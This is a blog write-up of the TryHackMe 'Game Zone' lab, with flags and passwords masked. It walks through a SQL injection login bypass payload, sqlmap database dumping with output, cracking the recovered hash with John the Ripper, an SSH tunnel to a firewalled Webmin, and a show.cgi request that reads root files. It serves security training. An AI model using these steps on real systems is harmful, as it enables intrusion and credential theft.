---
title: "GameZone_writeup.sh"
date: 2020-08-24T16:19:31-04:00
draft: false
toc: true
featured: false
summary: "This is a quick writeup or another 'just-me-taking-notes' thing for the GameZone's TryhackMe room."
cover: "img/gameZone_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Game Zone Room

This is a quick writeup or another "just-me-taking-notes" thing for the GameZone's TryhackMe room. This room is quite guided so there won't be much more detail added by this writup. Just straight to the point solutions for each task.
Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/gamezone).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.


[Task 1] Deploy the vulnerable machine
--------------------------------------


> Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?

For this we could do an image search but, since I know this from my old gamer times. It was quite easy to answer. If you don't know the answer, google is your friend.


[Task 2] Obtain access via SQLi
-------------------------------

So we need to exploit SQLi (injection) to get access to the server.

```SQL
	SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```

> Question#3 When you've logged in, what page do you get redirected to?

Às per the room we know there is no Admin username. In this case we can still use the following string as username leaving the password empty.

```SQL
	' or 1=1 -- -
```

After a using that string as username (leaving the password empty), we get logged in and arrive to a **portal.php** page. We can answer the question now.



[Task 3] Using SQLMap
---------------------


SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

First we need to use the portal page we are logged into, Using Burp suite intercept a simple search request made on that page. Save the request into a text file.We can then pass this into SQLMap to use our authenticated user session.


We just need to call SQLMap with this request following this format:

```bash
sqlmap -r search_req.txt --dbms=mysql --dump
```

- -r uses the intercepted request you saved earlier
- --dbms tells SQLMap what type of database management system it is
- --dump attempts to outputs the entire database

We'll get something like this


```bash
kali@kali:~/Documents/THM/gameZone$ sqlmap -r search_req.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.8#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:09:43 /2020-08-24/

[15:09:43] [INFO] parsing HTTP request from 'search_req.txt'
[15:09:43] [INFO] testing connection to the target URL
[15:09:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:09:44] [INFO] testing if the target URL content is stable
[15:09:45] [INFO] target URL content is stable
[15:09:45] [INFO] testing if POST parameter 'searchitem' is dynamic
[15:09:45] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[15:09:45] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[15:09:46] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[15:09:46] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[15:09:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:09:59] [WARNING] reflective value(s) found and filtering out
[15:10:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:10:05] [INFO] testing 'Generic inline queries'
[15:10:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[15:10:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'

```

This will take some time as SQLMap will try different ways of exploiting the DB, eventually it should dump the database.

> Question #2 In the users table, what is the hashed password?

From the data displayed by the tool we get that answer, also the next one as well.

> Question #3 What was the username associated with the hashed password?

Let's move to the next Task.

[Task 4] Cracking a password with JohnTheRipper
-----------------------------------------------

John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.

We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there. 

This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.

For this we need the hash string we found with SQLMap, save that into a txt file.

To run John we use the following command and we'll use **rockyou.txt** as our wordlist:


```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256

```
Let's break down that those options mean:

- hash.txt - contains a list of your hashes (in your case its just 1 hash)
- --wordlist - is the wordlist you're using to find the dehashed value
- --format - is the hashing algorithm used. In our case its hashed using SHA256.

Let's run John:

```bash
kali@kali:~/Documents/THM/gameZone$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTEDPASSWORD    (?)
1g 0:00:00:00 DONE (2020-08-24 15:31) 2.941g/s 8673Kp/s 8673Kc/s 8426KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed

```

> Question #2 What is the de-hashed password?

We answered that with the ouput from John.

> Question #3 Now you have a password and username. Try SSH'ing onto the machine.What is the user flag?


With the password we can now SSH into the computer:


```bash
kali@kali:~/Documents/THM/gameZone$ ssh agent47@10.10.89.82
The authenticity of host '10.10.89.82 (10.10.89.82)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.89.82' (ECDSA) to the list of known hosts.
agent47@10.10.89.82's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls -al
total 28
drwxr-xr-x 3 agent47 agent47 4096 Aug 16  2019 .
drwxr-xr-x 3 root    root    4096 Aug 14  2019 ..
lrwxrwxrwx 1 root    root       9 Aug 16  2019 .bash_history -> /dev/null
-rw-r--r-- 1 agent47 agent47  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 agent47 agent47 3771 Aug 14  2019 .bashrc
drwx------ 2 agent47 agent47 4096 Aug 16  2019 .cache
-rw-r--r-- 1 agent47 agent47  655 Aug 14  2019 .profile
-rw-rw-r-- 1 agent47 agent47   33 Aug 16  2019 user.txt
agent47@gamezone:~$ cat user.txt
{redacted_user_flag}

```

And there's our answer.


[Task 5] Exposing services with reverse SSH tunnels
---------------------------------------------------

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

e will use a tool called ss to investigate sockets running on a host.

If we run **ss -tulpn** it will tell us what socket connections are running

Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names


> Questions #1 How many TCP sockets are running?


Let's run **ss** and see what it shows:

```bash

agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q           Local Address:Port                          Peer Address:Port              
udp    UNCONN     0      0                            *:68                                       *:*                  
udp    UNCONN     0      0                            *:10000                                    *:*                  
tcp    LISTEN     0      80                   127.0.0.1:3306                                     *:*                  
tcp    LISTEN     0      128                          *:10000                                    *:*                  
tcp    LISTEN     0      128                          *:22                                       *:*                  
tcp    LISTEN     0      128                         :::80                                      :::*                  
tcp    LISTEN     0      128                         :::22                                      :::*     
```


We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run:

```bash
ssh -L 10000:localhost:10000 <username>@<ip>
```

Let's run that SSH:

```bash
kali@kali:~/Documents/THM/gameZone$ ssh -L 10000:localhost:10000 agent47@10.10.89.82
agent47@10.10.89.82's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Mon Aug 24 14:34:33 2020 from 10.13.0.34

```

> Question #2 What is the name of the exposed CMS?


Once complete, in your browser type **localhost:10000** and you can access the newly-exposed webserver.
When we do that, we see a **Webmin** login form.


> Question #3 What is the CMS version?

At this point we do have a username and password, so let's login to see the Webmin logged user page. With that we should have the information we need for Question number 3.


[Task 6] Privilege Escalation with Metasploit
---------------------------------------------


Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

Before we jump to **Metasploit** let's run **searchsploit webmin 1.580** to see if we can get a bit more of details on the available exploits:

```bash
kali@kali:~$ searchsploit webmin 1.580
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)               | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                       | linux/webapps/47330.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

We now know there is Remote Command Execution vulnerability availble and also a Remote Code Execution as well. Let's run **msfconsole** and see how we can exploit this CMS with Metasploit.

After failing for a while, I took a look on google to see if we can find the module itself to see what it does. Turns out its rather easy, it just uses the **show.cgi** component to read out any file passes into it. With this we can just run this on our local machine browser and get the root flag:



```bash
http://localhost:10000/file/show.cgi/root/root.txt

```

Once we run that command the browser will read out the contents of root.txt and give us the answer to the last Question:

> Question #1 What is the root flag?

a4b94{redacted_root_flag_XD}

As usual, happy hacking.

{{< thm_badge >}}